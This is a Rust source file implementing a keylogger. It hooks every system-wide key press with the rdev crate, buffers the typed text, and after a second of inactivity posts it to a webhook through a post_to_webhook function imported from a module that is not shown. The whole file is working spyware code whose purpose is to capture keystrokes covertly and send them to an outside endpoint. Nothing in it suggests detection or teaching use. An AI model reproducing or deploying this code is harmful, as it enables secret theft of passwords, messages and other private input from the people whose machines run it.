pub mod webhook;

use std::{
    sync::{Arc, Mutex},
    thread,
    time::{Duration, SystemTime},
};

use rdev::{Event, EventType, listen};

use webhook::post_to_webhook;
const ELAPSE_DURATION: Duration = Duration::from_secs(1);

pub struct KeyLogger {
    current: Arc<Mutex<String>>,

    last_press: Arc<Mutex<Option<SystemTime>>>,
}

impl KeyLogger {
    pub fn new() -> Self {
        Self {
            current: Arc::new(Mutex::new(String::new())),

            last_press: Arc::new(Mutex::new(None::<SystemTime>)),
        }
    }

    pub fn start(self) {
        {
            let last_press = Arc::clone(&self.last_press);
            let current = Arc::clone(&self.current);

            thread::spawn(move || {
                loop {
                    thread::sleep(ELAPSE_DURATION);

                    let last = *last_press.lock().unwrap();
                    let mut text = current.lock().unwrap();

                    if text.is_empty() {
                        continue;
                    }

                    if let Some(time) = last {
                        if let Ok(elapsed) = time.elapsed() {
                            if elapsed < ELAPSE_DURATION {
                                continue;
                            }

                            post_to_webhook(text.to_string());
                            text.clear();

                            *last_press.lock().unwrap() = None;
                        }
                    }
                }
            });
        }

        match listen(move |event: Event| match event.event_type {
            EventType::KeyPress(_) => {
                if let Some(key) = event.name {
                    *self.last_press.lock().unwrap() = Some(event.time);
                    self.current.lock().unwrap().push_str(&key);
                }
            }
            _ => (),
        }) {
            Err(error) => eprintln!("{:?}", error),
            _ => (),
        }
    }
}
